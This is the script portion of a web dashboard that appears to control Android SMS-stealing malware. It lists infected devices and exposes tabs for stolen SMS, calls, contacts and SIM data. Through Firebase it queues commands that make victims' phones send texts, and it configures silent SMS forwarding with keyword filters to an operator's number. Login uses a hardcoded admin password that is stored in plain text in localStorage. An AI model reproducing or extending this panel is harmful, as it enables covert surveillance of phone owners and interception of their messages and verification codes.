    tbody.innerHTML = l.map(function(log){
      return '<tr class="device-row"><td><b>'+esc(log.from||'?')+'</b></td>'+
        '<td>'+esc(log.to||'?')+'</td>'+
        '<td style="max-width:160px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">'+esc(log.body||'-')+'</td>'+
        '<td class="last-seen">'+(log.forwarded_at?new Date(log.forwarded_at).toLocaleString():'-')+'</td></tr>';
    }).join('');
  });
}

// ═══ TABS ═══
function switchTab(tab){
  document.querySelectorAll('.nav-tab').forEach(function(b){b.classList.remove('active');});
  var btn = document.querySelector('[onclick*="switchTab(\''+tab+'\')"]');
  if(btn) btn.classList.add('active');
  ['devices','sms','calls','contacts','permissions','siminfo','sendsms','forwarding'].forEach(function(t){
    document.getElementById(t+'Section').classList.add('hidden');
  });
  var sec = document.getElementById(tab+'Section');
  if(sec) sec.classList.remove('hidden');
}

// ═══ DEVICE TABLE ═══
function setDevFilter(f,btn){
  devFilter=f;
  document.querySelectorAll('.filter-btn').forEach(function(b){b.classList.remove('active');});
  btn.classList.add('active');
  renderDevices();
}
function renderDevices(){
  var tbody=document.getElementById('devTableBody'), q=(document.getElementById('devSearch').value||'').toLowerCase();
  var list=allDevs.filter(function(d){
    if(devFilter!=='all'&&d.status!==devFilter) return false;
    if(q&&d.name.toLowerCase().indexOf(q)<0&&d.id.toLowerCase().indexOf(q)<0&&d.brand.toLowerCase().indexOf(q)<0) return false;
    return true;
  });
  var empty=document.getElementById('devEmpty');
  if(list.length===0){tbody.innerHTML='';empty.classList.remove('hidden');return;}
  empty.classList.add('hidden');
  tbody.innerHTML=list.map(function(d){
    var bc=d.battery>50?'high':d.battery>20?'medium':'low';
    var diff=Date.now()-d.lastSeen, last=diff<60000?Math.floor(diff/1000)+'s ago':diff<3600000?Math.floor(diff/60000)+'m ago':Math.floor(diff/3600000)+'h ago';
    return '<tr class="device-row'+(d.id===selDev?' selected-row':'')+'" onclick="selectDevice(\''+d.id+'\')">'+
      '<td><div class="device-name-cell"><div class="device-icon">'+(d.status==='online'?'📱':'📴')+'</div>'+
      '<div><div class="device-name">'+esc(d.name+(d.brand?' ('+d.brand+')':''))+'</div>'+
      '<div class="device-id">'+esc(d.id.substring(0,16))+'</div></div></div></td>'+
      '<td><span class="status-badge '+d.status+'">'+d.status+(d.charging?' ⚡':'')+'</span></td>'+
      '<td><div class="battery-bar-wrap"><div class="battery-bar"><div class="battery-fill '+bc+'" style="width:'+Math.max(0,Math.min(100,d.battery))+'%"></div></div>'+
      '<span class="last-seen">'+d.battery+'%</span></div></td>'+
      '<td class="last-seen">'+esc(d.network)+'</td>'+
      '<td class="last-seen">'+d.smsCount+'</td>'+
      '<td class="last-seen">'+last+'</td></tr>';
  }).join('');
}
function updateStats(){
  document.getElementById('stTotal').textContent=allDevs.length;
  document.getElementById('stOnline').textContent=allDevs.filter(function(d){return d.status==='online';}).length;
  document.getElementById('stOffline').textContent=allDevs.filter(function(d){return d.status==='offline';}).length;
}

// ═══ SEND SMS ═══
function sendSms(){
  if(!selDev){showToast('error','No device selected!');return;}
  var n=document.getElementById('sendTo').value.trim();
  var m=document.getElementById('sendMsg').value.trim();
  if(!n||!m){document.getElementById('sendStatus').innerHTML='<span style="color:var(--error)">Fill all fields</span>';return;}
  DB.ref('devices/'+selDev+'/manual_commands/send_sms').push({to:n,message:m,timestamp:firebase.database.ServerValue.TIMESTAMP})
    .then(function(){
      document.getElementById('sendStatus').innerHTML='<span style="color:var(--success)">✅ Command sent to device!</span>';
      document.getElementById('sendMsg').value='';
      showToast('success','✅ SMS command queued');
    }).catch(function(e){
      document.getElementById('sendStatus').innerHTML='<span style="color:var(--error)">❌ Error: '+e.message+'</span>';
    });
}

// ═══ FORWARDING ═══
function toggleFw(){
  if(!selDev) return;
  DB.ref('devices/'+selDev+'/forwarding_settings/enabled').set(document.getElementById('fwToggle').checked);
}
function saveFw(){
  if(!selDev){showToast('error','No device selected!');return;}
  var filters=document.getElementById('fwFilters').value.split(',').map(function(f){return f.trim();}).filter(Boolean);
  DB.ref('devices/'+selDev+'/forwarding_settings').set({
    enabled:document.getElementById('fwToggle').checked,
    forward_to:document.getElementById('fwNumber').value.trim(),
    forward_all:document.getElementById('fwAll').checked,
    filters:filters,
    updated_at:firebase.database.ServerValue.TIMESTAMP
  }, function(err){
    if(err) showToast('error','❌ Save failed: '+err.message);
    else showToast('success','✅ Forwarding settings saved!');
  });
}

// ═══ HELPERS ═══
function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function filterRows(tbodyId, q){
  q=q.toLowerCase();
  document.querySelectorAll('#'+tbodyId+' tr').forEach(function(r){
    r.style.display=r.textContent.toLowerCase().includes(q)?'':'none';
  });
}
function showToast(t,m){
  var icons={success:'✅',error:'❌',info:'ℹ️'};
  var c=document.getElementById('toastContainer');
  var d=document.createElement('div');
  d.className='toast '+t;
  d.innerHTML='<span>'+icons[t]+'</span><span>'+m+'</span>';
  c.appendChild(d);
  setTimeout(function(){d.classList.add('out');setTimeout(function(){if(d.parentNode)d.remove();},250);},2800);
}

// ═══ LOGIN ═══
var AU='admin', AP='rebel2024';
(function(){
  var s=null;
  try{s=JSON.parse(localStorage.getItem('rbl_login'));}catch(e){}
  if(s&&s.u){document.getElementById('loginUser').value=s.u;document.getElementById('loginPass').value=s.p;document.getElementById('rememberMe').checked=true;}
})();
function doLogin(){
  var u=document.getElementById('loginUser').value.trim(), p=document.getElementById('loginPass').value;
  if(u===AU&&p===AP){
    if(document.getElementById('rememberMe').checked) localStorage.setItem('rbl_login',JSON.stringify({u:u,p:p}));
    else localStorage.removeItem('rbl_login');
    document.getElementById('loginError').style.display='none';
    document.getElementById('loginPage').classList.add('hidden');
  } else {
    document.getElementById('loginError').style.display='block';
    document.getElementById('loginPass').value='';
  }
}
document.addEventListener('keydown',function(e){
  if(!document.getElementById('loginPage').classList.contains('hidden')&&e.key==='Enter') doLogin();
});
setInterval(function(){document.getElementById('footerTime').textContent=new Date().toLocaleString();},1000);
</script>
</body>
</html>
